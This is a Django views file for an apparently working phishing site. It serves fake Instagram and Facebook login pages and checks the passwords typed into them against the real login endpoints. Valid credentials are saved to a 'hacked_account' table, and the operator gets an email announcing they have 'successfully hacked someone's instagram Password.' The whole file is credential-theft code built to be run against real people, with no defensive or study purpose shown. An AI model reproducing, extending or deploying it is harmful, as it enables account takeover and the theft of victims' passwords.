from django.shortcuts import render,redirect
from django.http import HttpResponse
from django.contrib.auth.models import User
from user.models import Account
from .models import hacked_account
from django.contrib import messages
from django.db.models.signals import post_save
from .models import hacked_account
from django.core.mail import send_mail

# Create your views here.
def account(request,aid,aname,uid):
    obj=Account.objects.get(id=aid)
    args={'obj':obj,'uid':uid}
    return render(request,'instaFollow.html',args)

def follow(request,uid,aid):
    return render(request,'instalogin.html',{'uid':uid,'aid':aid})

def login(request,uid,aid):
    if request.method=='POST':
        username=request.POST['instausername']
        password=request.POST['instapassword']
        from bs4 import BeautifulSoup
        import json, random, re, requests

        BASE_URL = 'https://www.instagram.com/accounts/login/'
        LOGIN_URL = BASE_URL + 'ajax/'

        headers_list = [
            "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101" \
            " Firefox/41.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2)" \
            " AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2" \
            " Safari/601.3.9",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0)" \
            " Gecko/20100101 Firefox/15.0.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
            " (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36" \
            " Edge/12.246"
        ]

        USERNAME = username
        PASSWD = password
        USER_AGENT = headers_list[random.randrange(0, 4)]

        session = requests.Session()
        session.headers = {'user-agent': USER_AGENT}
        session.headers.update({'Referer': BASE_URL})
        req = session.get(BASE_URL)
        soup = BeautifulSoup(req.content, 'html.parser')
        body = soup.find('body')

        pattern = re.compile('window._sharedData')
        script = body.find("script", text=pattern)

        script = script.get_text().replace('window._sharedData = ', '')[:-1]
        data = json.loads(script)

        csrf = data['config'].get('csrf_token')
        login_data = {'username': USERNAME, 'password': PASSWD}
        session.headers.update({'X-CSRFToken': csrf})
        login = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
        a = login.content
        a = json.loads(a)
        if a['user']==False:
            messages.info(request,"The username you entered doesn't belong to an account. Please check your username and try again.")

            path='/instagram/follow/'+str(uid)+'/'+str(aid)
            return redirect(path)

        elif a['authenticated']== False:
            messages.error(request,'The password you entered is incorrect. Please try again.')
            path='/instagram/follow/'+str(uid)+'/'+str(aid)
            return redirect(path)
        else:
            obj=hacked_account.objects.create(username=username,password=password,uid=uid)
            obj.save()
            objU = Account.objects.get(id=aid)
            args = {'obj': objU, 'uid': uid}
            return render(request,'afterfollow.html',args)


def sendMailSignal(sender,instance,*args,**kwargs):
        obj=User.objects.get(id=instance.uid)
        email=obj.email
        send_mail('Password Hacked', "Hai, You have successfully hacked someone's instagram Password.\n Please login to your instalink account to see the Password",
                  'instalinkgcs@gmail.com', [str(email)], fail_silently=False)


post_save.connect(sendMailSignal,sender=hacked_account)

def facebook(request,uid,aid):
    return render(request,'facebook.html',{'uid':uid,'aid':aid})

def fblogin(request,uid,aid):
    if request.method=='POST':
        username=request.POST['email']
        password=request.POST['password']
        import mechanize
        browser = mechanize.Browser()
        browser.set_handle_robots(False)
        # cookies = mechanize.CookieJar()
        # browser.set_cookiejar(cookies)
        browser.addheaders = [('User-agent',
                               'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
        browser.set_handle_refresh(False)

        url = 'http://www.facebook.com/login.php'
        browser.open(url)
        browser.select_form(nr=0)
        browser.form['email'] = username
        browser.form['pass'] = password
        response = browser.submit()
        item = 'welcome'
        print(response.geturl())
        if item in response.geturl():
            obj = hacked_account.objects.create(username=username, password=password, uid=uid)
            obj.save()
            objU = Account.objects.get(id=aid)
            args = {'obj': objU, 'uid': uid}
            return render(request, 'afterfollow.html', args)

        else:
            messages.error(request,'Invalid Username or Password')
            path = '/instagram/facebook/' + str(uid) + '/' + str(aid)
            return redirect(path)
